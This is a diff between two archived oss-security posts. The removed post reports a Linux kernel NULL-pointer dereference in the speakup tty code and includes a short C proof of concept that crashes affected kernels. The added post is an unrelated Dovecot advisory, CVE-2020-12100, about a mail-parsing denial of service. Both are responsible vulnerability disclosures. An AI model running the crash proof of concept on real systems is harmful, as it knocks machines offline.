@@ -1,70 +1,48 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/11/19/3
-Message-ID: <CAM1BPE6J_heHs_ckMm5u_Pv6Wnssv_3wgiCNBJs+HLQ+4qkC4A@mail.gmail.com>
-Date: Thu, 19 Nov 2020 10:46:59 +0800
-From: Shisong Qin <qinshisong1205@...il.com>
-To: oss-security@...ts.openwall.com
-Cc: nopitydays@...il.com
-Subject: Linux kernel NULL-ptr deref bug in spk_ttyio_ldisc_close
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/08/12/1
+Message-ID: <956af3a4-9b97-ad3f-cea5-001e9afe3435@dovecot.fi>
+Date: Wed, 12 Aug 2020 16:07:36 +0300
+From: Aki Tuomi <aki.tuomi@...ecot.fi>
+To: oss-security <oss-security@...ts.openwall.com>, full-disclosure <full-disclosure@...ts.openwall.com>
+Subject: CVE-2020-12100: Dovecot IMAP server: Receiving mail with deeply nested MIME parts leads to resource exhaustion
 Content-Type: text/plain; charset=utf-8
 
-Hi,
+Open-Xchange Security Advisory 2020-08-12
 
-Recently we found a NULL-ptr deref BUG in spk_ttyio.c in the longterm 4.19
-Linux kernel, and it could also be triggered in the 5.9 Linux kernel. In
-function spk_ttyio_ldisc_close, it would free the "speakup_tty->disc_data"
-and set "speakup_tty" to NULL. However, if we open two tty device and use
-tiocsetd() to set them as "speakup_tty" and close them in turn, the first
-close would set "speakup_tty" to NULL, and in the second close would try to
-dereference the "speakup_tty", leading to a NULL-ptr deref crash.
+Affected product: Dovecot IMAP server
+Internal reference: DOP-1849 (Bug ID)
+Vulnerability type: Uncontrolled recursion (CWE-674)
+Vulnerable version: 2.0
+Vulnerable component: submission, lmtp, lda
+Fixed version: 2.3.11.3
+Report confidence: Confirmed
+Solution status: Fix available
+Vendor notification: 2020-04-23
+CVE reference: CVE-2020-12100
+CVSS: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)
 
-This bug could be reproduced in the longterm 4.19 Linux kernel with
-CONFIG_STAGING=y, CONFIG_SPEAKUP=y and CONFIG_KASAN=y.
-To reproduce it in the 5.9 Linux kernel, CONFIG_ACCESSIBILITY=y is also
-required in config, and here is a simple poc:
+Vulnerability Details:
+Receiving mail with deeply nested MIME parts leads to resource
+exhaustion as Dovecot attempts to
+parse it.
 
-#define _GNU_SOURCE
+Risk:
+Malicious actor can cause denial of service to mail delivery by
+repeatedly sending mails with bad
+content.
 
-#include <dirent.h>
-#include <endian.h>
-#include <errno.h>
-#include <fcntl.h>
-#include <signal.h>
-#include <stdarg.h>
-#include <stdbool.h>
-#include <stdint.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/prctl.h>
-#include <sys/stat.h>
-#include <sys/syscall.h>
-#include <sys/types.h>
-#include <sys/wait.h>
-#include <time.h>
-#include <unistd.h>
+Workaround:
+Limit MIME structures in MTA.
 
-int main(void) {
-    int disc = 0x1a;
-    int fd = open("/dev/ptmx", O_RDWR, 0);
-    ioctl(fd, 0x5423, &disc);
-    int fd2 = open("/dev/ptmx", O_RDWR, 0);
-    ioctl(fd2, 0x5423, &disc);
-    return 0;
-}
+Solution:
+Upgrade to fixed version.
 
-After the process return, it seems the automated calling to release would
-trigger the NULL-ptr deref bug.
+Best regards,
 
-Here is the commit to patch this BUG:
-https://git.kernel.org/pub/scm/linux/kernel/git/gregkh/tty.git/commit/?h=tty-linus&id=d4122754442799187d5d537a9c039a49a67e57f1
+Aki Tuomi
+Open-Xchange oy
 
-Timeline:
-* 2020/11/10 - Vulnerability reported to security@...nel.org
-* 2020/11/11 - Vulnerability confirmed, and reported to
-linux-distros@...openwall.org.
-* 2020/11/19 - Vulnerability opened.
 
-Thanks,
-Shisong Qin and Bodong Zhao, Tsinghua University
 
+
+Download attachment "signature.asc" of type "application/pgp-signature" (489 bytes)
